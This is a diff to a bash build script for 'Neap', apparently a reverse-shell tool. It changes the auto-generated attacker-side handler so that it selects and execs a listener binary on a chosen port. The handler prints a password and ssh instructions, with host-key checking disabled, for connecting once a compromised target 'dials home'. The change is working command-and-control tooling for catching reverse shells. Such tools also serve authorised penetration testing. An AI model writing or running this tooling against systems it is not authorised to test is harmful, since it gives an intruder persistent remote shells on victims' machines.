@@ -299,6 +299,21 @@ build() {
     local handler_file
     if [ "$MODE" = "reverse" ]; then
         handler_file="$HANDLER_DIR/catch_${safe_name}.sh"
+        # Pick an attacker-side listener binary. The target-specific binary is
+        # reusable as a listener unless it was compiled with --nocli (which
+        # strips argument parsing and hard-codes dial-home mode). In the
+        # --nocli case, fall back to a generic bin/neap if one is present,
+        # otherwise point the user at the workaround.
+        local listener_bin
+        if [ -n "$NOCLI" ]; then
+            # Target binary has no CLI — it can't be told to listen. Prefer a
+            # generic ./neap next to it; if missing, the handler will fail fast
+            # with a clear message.
+            listener_bin="neap"
+        else
+            listener_bin="$safe_name"
+        fi
+
         cat > "$handler_file" <<HANDLER
 #!/usr/bin/env bash
 # Handler for Neap reverse shell — auto-generated
@@ -307,20 +322,32 @@ build() {
 
 set -euo pipefail
 
-echo "[*] Waiting for Neap reverse shell on port $PORT ..."
-echo "[*] Password: $PASSWORD"
-echo ""
+# Locate the listener binary (placed here at build time).
+script_dir="\$(cd "\$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
+listener="\$script_dir/../bin/$listener_bin"
 
-# Start SSH server to catch the reverse connection
-# The target runs Neap which dials home — you need an SSH client to connect.
-# Use: ssh -p $PORT $LUSER@localhost
-#   or if the target opens a bind port:
-#   ssh -p $BPORT $LUSER@<target>
+if [ ! -x "\$listener" ]; then
+    echo "[-] Listener binary not found: \$listener" >&2
+    echo "    Build a CLI-enabled neap and drop it there, or run manually:" >&2
+    echo "      neap -l -p $PORT -v" >&2
+    exit 1
+fi
 
-echo "[*] When the target connects, use:"
-echo "    ssh -o StrictHostKeyChecking=no -p $PORT $LUSER@127.0.0.1"
-echo ""
-echo "[*] Password: $PASSWORD"
+cat <<BANNER
+[*] Waiting for Neap reverse shell on port $PORT ...
+[*] Password: $PASSWORD
+
+[*] When the target connects, in another terminal run:
+    ssh -o StrictHostKeyChecking=no -p $PORT $LUSER@127.0.0.1
+    (password: $PASSWORD)
+
+[*] Ctrl+C to stop the listener.
+────────────────────────────────────────────────────────────────
+BANNER
+
+# Run the listener in the foreground (verbose) so incoming connections are
+# visible. Exec so the process replaces the shell — Ctrl+C stops it cleanly.
+exec "\$listener" -l -p $PORT -v
 HANDLER
         chmod +x "$handler_file"
         success "Handler: $handler_file"
